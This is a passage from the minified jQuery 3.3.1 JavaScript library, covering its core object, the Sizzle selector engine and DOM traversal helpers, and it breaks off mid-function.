
/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */
!function(e,t){"use strict";"object"==typeof module&&"object"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error("jQuery requires a window with a document");return t(e)}:t(e)}("undefined"!=typeof window?window:this,function(e,t){"use strict";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return"function"==typeof t&&"number"!=typeof t.nodeType},y=function e(t){return null!=t&&t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement("script");if(o.text=e,n)for(i in v)n[i]&&(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+"":"object"==typeof e||"function"==typeof e?l[c.call(e)]||"object":typeof e}var b="3.3.1",w=function(e,t){return new w.fn.init(e,t)},T=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;w.fn=w.prototype={jquery:"3.3.1",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e<0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e<0?t:0);return this.pushStack(n>=0&&n<t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for("boolean"==typeof a&&(l=a,a=arguments[s]||{},s++),"object"==typeof a||g(a)||(a={}),s===u&&(a=this,s--);s<u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&&(l&&r&&(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&&Array.isArray(n)?n:[]):o=n&&w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&&(a[t]=r));return a},w.extend({expando:"jQuery"+("3.3.1"+Math.random()).replace(/\D/g,""),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||"[object Object]"!==c.call(e))&&(!(t=i(e))||"function"==typeof(n=f.call(t,"constructor")&&t.constructor)&&p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r<n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?"":(e+"").replace(T,"")},makeArray:function(e,t){var n=t||[];return null!=e&&(C(Object(e))?w.merge(n,"string"==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r<n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o<a;o++)(r=!t(e[o],o))!==s&&i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o<r;o++)null!=(i=t(e[o],o,n))&&s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&&s.push(i);return a.apply([],s)},guid:1,support:h}),"function"==typeof Symbol&&(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "),function(e,t){l["[object "+t+"]"]=t.toLowerCase()});function C(e){var t=!!e&&"length"in e&&e.length,n=x(e);return!g(e)&&!y(e)&&("array"===n||0===t||"number"==typeof t&&t>0&&t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b="sizzle"+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&&(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n<r;n++)if(e[n]===t)return n;return-1},P="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",M="[\\x20\\t\\r\\n\\f]",R="(?:\\\\.|[\\w-]|[^\0-\\xa0])+",I="\\["+M+"*("+R+")(?:"+M+"*([*^$|!~]?=)"+M+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+R+"))|)"+M+"*\\]",W=":("+R+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+I+")*)|.*)\\)|)",$=new RegExp(M+"+","g"),B=new RegExp("^"+M+"+|((?:^|[^\\\\])(?:\\\\.)*)"+M+"+$","g"),F=new RegExp("^"+M+"*,"+M+"*"),_=new RegExp("^"+M+"*([>+~]|"+M+")"+M+"*"),z=new RegExp("="+M+"*([^\\]'\"]*?)"+M+"*\\]","g"),X=new RegExp(W),U=new RegExp("^"+R+"$"),V={ID:new RegExp("^#("+R+")"),CLASS:new RegExp("^\\.("+R+")"),TAG:new RegExp("^("+R+"|[*])"),ATTR:new RegExp("^"+I),PSEUDO:new RegExp("^"+W),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+M+"*(even|odd|(([+-]|)(\\d*)n|)"+M+"*(?:([+-]|)"+M+"*(\\d+)|))"+M+"*\\)|)","i"),bool:new RegExp("^(?:"+P+")$","i"),needsContext:new RegExp("^"+M+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+M+"*((?:-\\d)?\\d*)"+M+"*\\)|)(?=[^-]|$)","i")},G=/^(?:input|select|textarea|button)$/i,Y=/^h\d$/i,Q=/^[^{]+\{\s*\[native \w/,J=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,K=/[+~]/,Z=new RegExp("\\\\([\\da-f]{1,6}"+M+"?|("+M+")|.)","ig"),ee=function(e,t,n){var r="0x"+t-65536;return r!==r||n?t:r<0?String.fromCharCode(r+65536):String.fromCharCode(r>>10|55296,1023&r|56320)},te=/([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,ne=function(e,t){return t?"\0"===e?"\ufffd":e.slice(0,-1)+"\\"+e.charCodeAt(e.length-1).toString(16)+" ":"\\"+e},re=function(){p()},ie=me(function(e){return!0===e.disabled&&("form"in e||"label"in e)},{dir:"parentNode",next:"legend"});try{L.apply(A=H.call(w.childNodes),w.childNodes),A[w.childNodes.length].nodeType}catch(e){L={apply:A.length?function(e,t){q.apply(e,H.call(t))}:function(e,t){var n=e.length,r=0;while(e[n++]=t[r++]);e.length=n-1}}}function oe(e,t,r,i){var o,s,l,c,f,h,v,m=t&&t.ownerDocument,T=t?t.nodeType:9;if(r=r||[],"string"!=typeof e||!e||1!==T&&9!==T&&11!==T)return r;if(!i&&((t?t.ownerDocument||t:w)!==d&&p(t),t=t||d,g)){if(11!==T&&(f=J.exec(e)))if(o=f[1]){if(9===T){if(!(l=t.getElementById(o)))return r;if(l.id===o)return r.push(l),r}else if(m&&(l=m.getElementById(o))&&x(t,l)&&l.id===o)return r.push(l),r}else{if(f[2])return L.apply(r,t.getElementsByTagName(e)),r;if((o=f[3])&&n.getElementsByClassName&&t.getElementsByClassName)return L.apply(r,t.getElementsByClassName(o)),r}if(n.qsa&&!S[e+" "]&&(!y||!y.test(e))){if(1!==T)m=t,v=e;else if("object"!==t.nodeName.toLowerCase()){(c=t.getAttribute("id"))?c=c.replace(te,ne):t.setAttribute("id",c=b),s=(h=a(e)).length;while(s--)h[s]="#"+c+" "+ve(h[s]);v=h.join(","),m=K.test(e)&&ge(t.parentNode)||t}if(v)try{return L.apply(r,m.querySelectorAll(v)),r}catch(e){}finally{c===b&&t.removeAttribute("id")}}}return u(e.replace(B,"$1"),t,r,i)}function ae(){var e=[];function t(n,i){return e.push(n+" ")>r.cacheLength&&delete t[e.shift()],t[n+" "]=i}return t}function se(e){return e[b]=!0,e}function ue(e){var t=d.createElement("fieldset");try{return!!e(t)}catch(e){return!1}finally{t.parentNode&&t.parentNode.removeChild(t),t=null}}function le(e,t){var n=e.split("|"),i=n.length;while(i--)r.attrHandle[n[i]]=t}function ce(e,t){var n=t&&e,r=n&&1===e.nodeType&&1===t.nodeType&&e.sourceIndex-t.sourceIndex;if(r)return r;if(n)while(n=n.nextSibling)if(n===t)return-1;return e?1:-1}function fe(e){return function(t){return"input"===t.nodeName.toLowerCase()&&t.type===e}}function pe(e){return function(t){var n=t.nodeName.toLowerCase();return("input"===n||"button"===n)&&t.type===e}}function de(e){return function(t){return"form"in t?t.parentNode&&!1===t.disabled?"label"in t?"label"in t.parentNode?t.parentNode.disabled===e:t.disabled===e:t.isDisabled===e||t.isDisabled!==!e&&ie(t)===e:t.disabled===e:"label"in t&&t.disabled===e}}function he(e){return se(function(t){return t=+t,se(function(n,r){var i,o=e([],n.length,t),a=o.length;while(a--)n[i=o[a]]&&(n[i]=!(r[i]=n[i]))})})}function ge(e){return e&&"undefined"!=typeof e.getElementsByTagName&&e}n=oe.support={},o=oe.isXML=function(e){var t=e&&(e.ownerDocument||e).documentElement;return!!t&&"HTML"!==t.nodeName},p=oe.setDocument=function(e){var t,i,a=e?e.ownerDocument||e:w;return a!==d&&9===a.nodeType&&a.documentElement?(d=a,h=d.documentElement,g=!o(d),w!==d&&(i=d.defaultView)&&i.top!==i&&(i.addEventListener?i.addEventListener("unload",re,!1):i.attachEvent&&i.attachEvent("onunload",re)),n.attributes=ue(function(e){return e.className="i",!e.getAttribute("className")}),n.getElementsByTagName=ue(function(e){return e.appendChild(d.createComment("")),!e.getElementsByTagName("*").length}),n.getElementsByClassName=Q.test(d.getElementsByClassName),n.getById=ue(function(e){return h.appendChild(e).id=b,!d.getElementsByName||!d.getElementsByName(b).length}),n.getById?(r.filter.ID=function(e){var t=e.replace(Z,ee);return function(e){return e.getAttribute("id")===t}},r.find.ID=function(e,t){if("undefined"!=typeof t.getElementById&&g){var n=t.getElementById(e);return n?[n]:[]}}):(r.filter.ID=function(e){var t=e.replace(Z,ee);return function(e){var n="undefined"!=typeof e.getAttributeNode&&e.getAttributeNode("id");return n&&n.value===t}},r.find.ID=function(e,t){if("undefined"!=typeof t.getElementById&&g){var n,r,i,o=t.getElementById(e);if(o){if((n=o.getAttributeNode("id"))&&n.value===e)return[o];i=t.getElementsByName(e),r=0;while(o=i[r++])if((n=o.getAttributeNode("id"))&&n.value===e)return[o]}return[]}}),r.find.TAG=n.getElementsByTagName?function(e,t){return"undefined"!=typeof t.getElementsByTagName?t.getElementsByTagName(e):n.qsa?t.querySelectorAll(e):void 0}:function(e,t){var n,r=[],i=0,o=t.getElementsByTagName(e);if("*"===e){while(n=o[i++])1===n.nodeType&&r.push(n);return r}return o},r.find.CLASS=n.getElementsByClassName&&function(e,t){if("undefined"!=typeof t.getElementsByClassName&&g)return t.getElementsByClassName(e)},v=[],y=[],(n.qsa=Q.test(d.querySelectorAll))&&(ue(function(e){h.appendChild(e).innerHTML="<a id='"+b+"'></a><select id='"+b+"-\r\\' msallowcapture=''><option selected=''></option></select>",e.querySelectorAll("[msallowcapture^='']").length&&y.push("[*^$]="+M+"*(?:''|\"\")"),e.querySelectorAll("[selected]").length||y.push("\\["+M+"*(?:value|"+P+")"),e.querySelectorAll("[id~="+b+"-]").length||y.push("~="),e.querySelectorAll(":checked").length||y.push(":checked"),e.querySelectorAll("a#"+b+"+*").length||y.push(".#.+[+~]")}),ue(function(e){e.innerHTML="<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";var t=d.createElement("input");t.setAttribute("type","hidden"),e.appendChild(t).setAttribute("name","D"),e.querySelectorAll("[name=d]").length&&y.push("name"+M+"*[*^$|!~]?="),2!==e.querySelectorAll(":enabled").length&&y.push(":enabled",":disabled"),h.appendChild(e).disabled=!0,2!==e.querySelectorAll(":disabled").length&&y.push(":enabled",":disabled"),e.querySelectorAll("*,:x"),y.push(",.*:")})),(n.matchesSelector=Q.test(m=h.matches||h.webkitMatchesSelector||h.mozMatchesSelector||h.oMatchesSelector||h.msMatchesSelector))&&ue(function(e){n.disconnectedMatch=m.call(e,"*"),m.call(e,"[s!='']:x"),v.push("!=",W)}),y=y.length&&new RegExp(y.join("|")),v=v.length&&new RegExp(v.join("|")),t=Q.test(h.compareDocumentPosition),x=t||Q.test(h.contains)?function(e,t){var n=9===e.nodeType?e.documentElement:e,r=t&&t.parentNode;return e===r||!(!r||1!==r.nodeType||!(n.contains?n.contains(r):e.compareDocumentPosition&&16&e.compareDocumentPosition(r)))}:function(e,t){if(t)while(t=t.parentNode)if(t===e)return!0;return!1},D=t?function(e,t){if(e===t)return f=!0,0;var r=!e.compareDocumentPosition-!t.compareDocumentPosition;return r||(1&(r=(e.ownerDocument||e)===(t.ownerDocument||t)?e.compareDocumentPosition(t):1)||!n.sortDetached&&t.compareDocumentPosition(e)===r?e===d||e.ownerDocument===w&&x(w,e)?-1:t===d||t.ownerDocument===w&&x(w,t)?1:c?O(c,e)-O(c,t):0:4&r?-1:1)}:function(e,t){if(e===t)return f=!0,0;var n,r=0,i=e.parentNode,o=t.parentNode,a=[e],s=[t];if(!i||!o)return e===d?-1:t===d?1:i?-1:o?1:c?O(c,e)-O(c,t):0;if(i===o)return ce(e,t);n=e;while(n=n.parentNode)a.unshift(n);n=t;while(n=n.parentNode)s.unshift(n);while(a[r]===s[r])r++;return r?ce(a[r],s[r]):a[r]===w?-1:s[r]===w?1:0},d):d},oe.matches=function(e,t){return oe(e,null,null,t)},oe.matchesSelector=function(e,t){if((e.ownerDocument||e)!==d&&p(e),t=t.replace(z,"='$1']"),n.matchesSelector&&g&&!S[t+" "]&&(!v||!v.test(t))&&(!y||!y.test(t)))try{var r=m.call(e,t);if(r||n.disconnectedMatch||e.document&&11!==e.document.nodeType)return r}catch(e){}return oe(t,d,null,[e]).length>0},oe.contains=function(e,t){return(e.ownerDocument||e)!==d&&p(e),x(e,t)},oe.attr=function(e,t){(e.ownerDocument||e)!==d&&p(e);var i=r.attrHandle[t.toLowerCase()],o=i&&N.call(r.attrHandle,t.toLowerCase())?i(e,t,!g):void 0;return void 0!==o?o:n.attributes||!g?e.getAttribute(t):(o=e.getAttributeNode(t))&&o.specified?o.value:null},oe.escape=function(e){return(e+"").replace(te,ne)},oe.error=function(e){throw new Error("Syntax error, unrecognized expression: "+e)},oe.uniqueSort=function(e){var t,r=[],i=0,o=0;if(f=!n.detectDuplicates,c=!n.sortStable&&e.slice(0),e.sort(D),f){while(t=e[o++])t===e[o]&&(i=r.push(o));while(i--)e.splice(r[i],1)}return c=null,e},i=oe.getText=function(e){var t,n="",r=0,o=e.nodeType;if(o){if(1===o||9===o||11===o){if("string"==typeof e.textContent)return e.textContent;for(e=e.firstChild;e;e=e.nextSibling)n+=i(e)}else if(3===o||4===o)return e.nodeValue}else while(t=e[r++])n+=i(t);return n},(r=oe.selectors={cacheLength:50,createPseudo:se,match:V,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(e){return e[1]=e[1].replace(Z,ee),e[3]=(e[3]||e[4]||e[5]||"").replace(Z,ee),"~="===e[2]&&(e[3]=" "+e[3]+" "),e.slice(0,4)},CHILD:function(e){return e[1]=e[1].toLowerCase(),"nth"===e[1].slice(0,3)?(e[3]||oe.error(e[0]),e[4]=+(e[4]?e[5]+(e[6]||1):2*("even"===e[3]||"odd"===e[3])),e[5]=+(e[7]+e[8]||"odd"===e[3])):e[3]&&oe.error(e[0]),e},PSEUDO:function(e){var t,n=!e[6]&&e[2];return V.CHILD.test(e[0])?null:(e[3]?e[2]=e[4]||e[5]||"":n&&X.test(n)&&(t=a(n,!0))&&(t=n.indexOf(")",n.length-t)-n.length)&&(e[0]=e[0].slice(0,t),e[2]=n.slice(0,t)),e.slice(0,3))}},filter:{TAG:function(e){var t=e.replace(Z,ee).toLowerCase();return"*"===e?function(){return!0}:function(e){return e.nodeName&&e.nodeName.toLowerCase()===t}},CLASS:function(e){var t=E[e+" "];return t||(t=new RegExp("(^|"+M+")"+e+"("+M+"|$)"))&&E(e,function(e){return t.test("string"==typeof e.className&&e.className||"undefined"!=typeof e.getAttribute&&e.getAttribute("class")||"")})},ATTR:function(e,t,n){return function(r){var i=oe.attr(r,e);return null==i?"!="===t:!t||(i+="","="===t?i===n:"!="===t?i!==n:"^="===t?n&&0===i.indexOf(n):"*="===t?n&&i.indexOf(n)>-1:"$="===t?n&&i.slice(-n.length)===n:"~="===t?(" "+i.replace($," ")+" ").indexOf(n)>-1:"|="===t&&(i===n||i.slice(0,n.length+1)===n+"-"))}},CHILD:function(e,t,n,r,i){var o="nth"!==e.slice(0,3),a="last"!==e.slice(-4),s="of-type"===t;return 1===r&&0===i?function(e){return!!e.parentNode}:function(t,n,u){var l,c,f,p,d,h,g=o!==a?"nextSibling":"previousSibling",y=t.parentNode,v=s&&t.nodeName.toLowerCase(),m=!u&&!s,x=!1;if(y){if(o){while(g){p=t;while(p=p[g])if(s?p.nodeName.toLowerCase()===v:1===p.nodeType)return!1;h=g="only"===e&&!h&&"nextSibling"}return!0}if(h=[a?y.firstChild:y.lastChild],a&&m){x=(d=(l=(c=(f=(p=y)[b]||(p[b]={}))[p.uniqueID]||(f[p.uniqueID]={}))[e]||[])[0]===T&&l[1])&&l[2],p=d&&y.childNodes[d];while(p=++d&&p&&p[g]||(x=d=0)||h.pop())if(1===p.nodeType&&++x&&p===t){c[e]=[T,d,x];break}}else if(m&&(x=d=(l=(c=(f=(p=t)[b]||(p[b]={}))[p.uniqueID]||(f[p.uniqueID]={}))[e]||[])[0]===T&&l[1]),!1===x)while(p=++d&&p&&p[g]||(x=d=0)||h.pop())if((s?p.nodeName.toLowerCase()===v:1===p.nodeType)&&++x&&(m&&((c=(f=p[b]||(p[b]={}))[p.uniqueID]||(f[p.uniqueID]={}))[e]=[T,x]),p===t))break;return(x-=i)===r||x%r==0&&x/r>=0}}},PSEUDO:function(e,t){var n,i=r.pseudos[e]||r.setFilters[e.toLowerCase()]||oe.error("unsupported pseudo: "+e);return i[b]?i(t):i.length>1?(n=[e,e,"",t],r.setFilters.hasOwnProperty(e.toLowerCase())?se(function(e,n){var r,o=i(e,t),a=o.length;while(a--)e[r=O(e,o[a])]=!(n[r]=o[a])}):function(e){return i(e,0,n)}):i}},pseudos:{not:se(function(e){var t=[],n=[],r=s(e.replace(B,"$1"));return r[b]?se(function(e,t,n,i){var o,a=r(e,null,i,[]),s=e.length;while(s--)(o=a[s])&&(e[s]=!(t[s]=o))}):function(e,i,o){return t[0]=e,r(t,null,o,n),t[0]=null,!n.pop()}}),has:se(function(e){return function(t){return oe(e,t).length>0}}),contains:se(function(e){return e=e.replace(Z,ee),function(t){return(t.textContent||t.innerText||i(t)).indexOf(e)>-1}}),lang:se(function(e){return U.test(e||"")||oe.error("unsupported lang: "+e),e=e.replace(Z,ee).toLowerCase(),function(t){var n;do{if(n=g?t.lang:t.getAttribute("xml:lang")||t.getAttribute("lang"))return(n=n.toLowerCase())===e||0===n.indexOf(e+"-")}while((t=t.parentNode)&&1===t.nodeType);return!1}}),target:function(t){var n=e.location&&e.location.hash;return n&&n.slice(1)===t.id},root:function(e){return e===h},focus:function(e){return e===d.activeElement&&(!d.hasFocus||d.hasFocus())&&!!(e.type||e.href||~e.tabIndex)},enabled:de(!1),disabled:de(!0),checked:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&!!e.checked||"option"===t&&!!e.selected},selected:function(e){return e.parentNode&&e.parentNode.selectedIndex,!0===e.selected},empty:function(e){for(e=e.firstChild;e;e=e.nextSibling)if(e.nodeType<6)return!1;return!0},parent:function(e){return!r.pseudos.empty(e)},header:function(e){return Y.test(e.nodeName)},input:function(e){return G.test(e.nodeName)},button:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&"button"===e.type||"button"===t},text:function(e){var t;return"input"===e.nodeName.toLowerCase()&&"text"===e.type&&(null==(t=e.getAttribute("type"))||"text"===t.toLowerCase())},first:he(function(){return[0]}),last:he(function(e,t){return[t-1]}),eq:he(function(e,t,n){return[n<0?n+t:n]}),even:he(function(e,t){for(var n=0;n<t;n+=2)e.push(n);return e}),odd:he(function(e,t){for(var n=1;n<t;n+=2)e.push(n);return e}),lt:he(function(e,t,n){for(var r=n<0?n+t:n;--r>=0;)e.push(r);return e}),gt:he(function(e,t,n){for(var r=n<0?n+t:n;++r<t;)e.push(r);return e})}}).pseudos.nth=r.pseudos.eq;for(t in{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})r.pseudos[t]=fe(t);for(t in{submit:!0,reset:!0})r.pseudos[t]=pe(t);function ye(){}ye.prototype=r.filters=r.pseudos,r.setFilters=new ye,a=oe.tokenize=function(e,t){var n,i,o,a,s,u,l,c=k[e+" "];if(c)return t?0:c.slice(0);s=e,u=[],l=r.preFilter;while(s){n&&!(i=F.exec(s))||(i&&(s=s.slice(i[0].length)||s),u.push(o=[])),n=!1,(i=_.exec(s))&&(n=i.shift(),o.push({value:n,type:i[0].replace(B," ")}),s=s.slice(n.length));for(a in r.filter)!(i=V[a].exec(s))||l[a]&&!(i=l[a](i))||(n=i.shift(),o.push({value:n,type:a,matches:i}),s=s.slice(n.length));if(!n)break}return t?s.length:s?oe.error(e):k(e,u).slice(0)};function ve(e){for(var t=0,n=e.length,r="";t<n;t++)r+=e[t].value;return r}function me(e,t,n){var r=t.dir,i=t.next,o=i||r,a=n&&"parentNode"===o,s=C++;return t.first?function(t,n,i){while(t=t[r])if(1===t.nodeType||a)return e(t,n,i);return!1}:function(t,n,u){var l,c,f,p=[T,s];if(u){while(t=t[r])if((1===t.nodeType||a)&&e(t,n,u))return!0}else while(t=t[r])if(1===t.nodeType||a)if(f=t[b]||(t[b]={}),c=f[t.uniqueID]||(f[t.uniqueID]={}),i&&i===t.nodeName.toLowerCase())t=t[r]||t;else{if((l=c[o])&&l[0]===T&&l[1]===s)return p[2]=l[2];if(c[o]=p,p[2]=e(t,n,u))return!0}return!1}}function xe(e){return e.length>1?function(t,n,r){var i=e.length;while(i--)if(!e[i](t,n,r))return!1;return!0}:e[0]}function be(e,t,n){for(var r=0,i=t.length;r<i;r++)oe(e,t[r],n);return n}function we(e,t,n,r,i){for(var o,a=[],s=0,u=e.length,l=null!=t;s<u;s++)(o=e[s])&&(n&&!n(o,r,i)||(a.push(o),l&&t.push(s)));return a}function Te(e,t,n,r,i,o){return r&&!r[b]&&(r=Te(r)),i&&!i[b]&&(i=Te(i,o)),se(function(o,a,s,u){var l,c,f,p=[],d=[],h=a.length,g=o||be(t||"*",s.nodeType?[s]:s,[]),y=!e||!o&&t?g:we(g,p,e,s,u),v=n?i||(o?e:h||r)?[]:a:y;if(n&&n(y,v,s,u),r){l=we(v,d),r(l,[],s,u),c=l.length;while(c--)(f=l[c])&&(v[d[c]]=!(y[d[c]]=f))}if(o){if(i||e){if(i){l=[],c=v.length;while(c--)(f=v[c])&&l.push(y[c]=f);i(null,v=[],l,u)}c=v.length;while(c--)(f=v[c])&&(l=i?O(o,f):p[c])>-1&&(o[l]=!(a[l]=f))}}else v=we(v===a?v.splice(h,v.length):v),i?i(null,a,v,u):L.apply(a,v)})}function Ce(e){for(var t,n,i,o=e.length,a=r.relative[e[0].type],s=a||r.relative[" "],u=a?1:0,c=me(function(e){return e===t},s,!0),f=me(function(e){return O(t,e)>-1},s,!0),p=[function(e,n,r){var i=!a&&(r||n!==l)||((t=n).nodeType?c(e,n,r):f(e,n,r));return t=null,i}];u<o;u++)if(n=r.relative[e[u].type])p=[me(xe(p),n)];else{if((n=r.filter[e[u].type].apply(null,e[u].matches))[b]){for(i=++u;i<o;i++)if(r.relative[e[i].type])break;return Te(u>1&&xe(p),u>1&&ve(e.slice(0,u-1).concat({value:" "===e[u-2].type?"*":""})).replace(B,"$1"),n,u<i&&Ce(e.slice(u,i)),i<o&&Ce(e=e.slice(i)),i<o&&ve(e))}p.push(n)}return xe(p)}function Ee(e,t){var n=t.length>0,i=e.length>0,o=function(o,a,s,u,c){var f,h,y,v=0,m="0",x=o&&[],b=[],w=l,C=o||i&&r.find.TAG("*",c),E=T+=null==w?1:Math.random()||.1,k=C.length;for(c&&(l=a===d||a||c);m!==k&&null!=(f=C[m]);m++){if(i&&f){h=0,a||f.ownerDocument===d||(p(f),s=!g);while(y=e[h++])if(y(f,a||d,s)){u.push(f);break}c&&(T=E)}n&&((f=!y&&f)&&v--,o&&x.push(f))}if(v+=m,n&&m!==v){h=0;while(y=t[h++])y(x,b,a,s);if(o){if(v>0)while(m--)x[m]||b[m]||(b[m]=j.call(u));b=we(b)}L.apply(u,b),c&&!o&&b.length>0&&v+t.length>1&&oe.uniqueSort(u)}return c&&(T=E,l=w),x};return n?se(o):o}return s=oe.compile=function(e,t){var n,r=[],i=[],o=S[e+" "];if(!o){t||(t=a(e)),n=t.length;while(n--)(o=Ce(t[n]))[b]?r.push(o):i.push(o);(o=S(e,Ee(i,r))).selector=e}return o},u=oe.select=function(e,t,n,i){var o,u,l,c,f,p="function"==typeof e&&e,d=!i&&a(e=p.selector||e);if(n=n||[],1===d.length){if((u=d[0]=d[0].slice(0)).length>2&&"ID"===(l=u[0]).type&&9===t.nodeType&&g&&r.relative[u[1].type]){if(!(t=(r.find.ID(l.matches[0].replace(Z,ee),t)||[])[0]))return n;p&&(t=t.parentNode),e=e.slice(u.shift().value.length)}o=V.needsContext.test(e)?0:u.length;while(o--){if(l=u[o],r.relative[c=l.type])break;if((f=r.find[c])&&(i=f(l.matches[0].replace(Z,ee),K.test(u[0].type)&&ge(t.parentNode)||t))){if(u.splice(o,1),!(e=i.length&&ve(u)))return L.apply(n,i),n;break}}}return(p||s(e,d))(i,t,!g,n,!t||K.test(e)&&ge(t.parentNode)||t),n},n.sortStable=b.split("").sort(D).join("")===b,n.detectDuplicates=!!f,p(),n.sortDetached=ue(function(e){return 1&e.compareDocumentPosition(d.createElement("fieldset"))}),ue(function(e){return e.innerHTML="<a href='#'></a>","#"===e.firstChild.getAttribute("href")})||le("type|href|height|width",function(e,t,n){if(!n)return e.getAttribute(t,"type"===t.toLowerCase()?1:2)}),n.attributes&&ue(function(e){return e.innerHTML="<input/>",e.firstChild.setAttribute("value",""),""===e.firstChild.getAttribute("value")})||le("value",function(e,t,n){if(!n&&"input"===e.nodeName.toLowerCase())return e.defaultValue}),ue(function(e){return null==e.getAttribute("disabled")})||le(P,function(e,t,n){var r;if(!n)return!0===e[t]?t.toLowerCase():(r=e.getAttributeNode(t))&&r.specified?r.value:null}),oe}(e);w.find=E,w.expr=E.selectors,w.expr[":"]=w.expr.pseudos,w.uniqueSort=w.unique=E.uniqueSort,w.text=E.getText,w.isXMLDoc=E.isXML,w.contains=E.contains,w.escapeSelector=E.escape;var k=function(e,t,n){var r=[],i=void 0!==n;while((e=e[t])&&9!==e.nodeType)if(1===e.nodeType){if(i&&w(e).is(n))break;r.push(e)}return r},S=function(e,t){for(var n=[];e;e=e.nextSibling)1===e.nodeType&&e!==t&&n.push(e);return n},D=w.expr.match.needsContext;function N(e,t){return e.nodeName&&e.nodeName.toLowerCase()===t.toLowerCase()}var A=/^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;function j(e,t,n){return g(t)?w.grep(e,function(e,r){return!!t.call(e,r,e)!==n}):t.nodeType?w.grep(e,function(e){return e===t!==n}):"string"!=typeof t?w.grep(e,function(e){return u.call(t,e)>-1!==n}):w.filter(t,e,n)}w.filter=function(e,t,n){var r=t[0];return n&&(e=":not("+e+")"),1===t.length&&1===r.nodeType?w.find.matchesSelector(r,e)?[r]:[]:w.find.matches(e,w.grep(t,function(e){return 1===e.nodeType}))},w.fn.extend({find:function(e){var t,n,r=this.length,i=this;if("string"!=typeof e)return this.pushStack(w(e).filter(function(){for(t=0;t<r;t++)if(w.contains(i[t],this))return!0}));for(n=this.pushStack([]),t=0;t<r;t++)w.find(e,i[t],n);return r>1?w.uniqueSort(n):n},filter:function(e){return this.pushStack(j(this,e||[],!1))},not:function(e){return this.pushStack(j(this,e||[],!0))},is:function(e){return!!j(this,"string"==typeof e&&D.test(e)?w(e):e||[],!1).length}});var q,L=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;(w.fn.init=function(e,t,n){var i,o;if(!e)return this;if(n=n||q,"string"==typeof e){if(!(i="<"===e[0]&&">"===e[e.length-1]&&e.length>=3?[null,e,null]:L.exec(e))||!i[1]&&t)return!t||t.jquery?(t||n).find(e):this.constructor(t).find(e);if(i[1]){if(t=t instanceof w?t[0]:t,w.merge(this,w.parseHTML(i[1],t&&t.nodeType?t.ownerDocument||t:r,!0)),A.test(i[1])&&w.isPlainObject(t))for(i in t)g(this[i])?this[i](t[i]):this.attr(i,t[i]);return this}return(o=r.getElementById(i[2]))&&(this[0]=o,this.length=1),this}return e.nodeType?(this[0]=e,this.length=1,this):g(e)?void 0!==n.ready?n.ready(e):e(w):w.makeArray(e,this)}).prototype=w.fn,q=w(r);var H=/^(?:parents|prev(?:Until|All))/,O={children:!0,contents:!0,next:!0,prev:!0};w.fn.extend({has:function(e){var t=w(e,this),n=t.length;return this.filter(function(){for(var 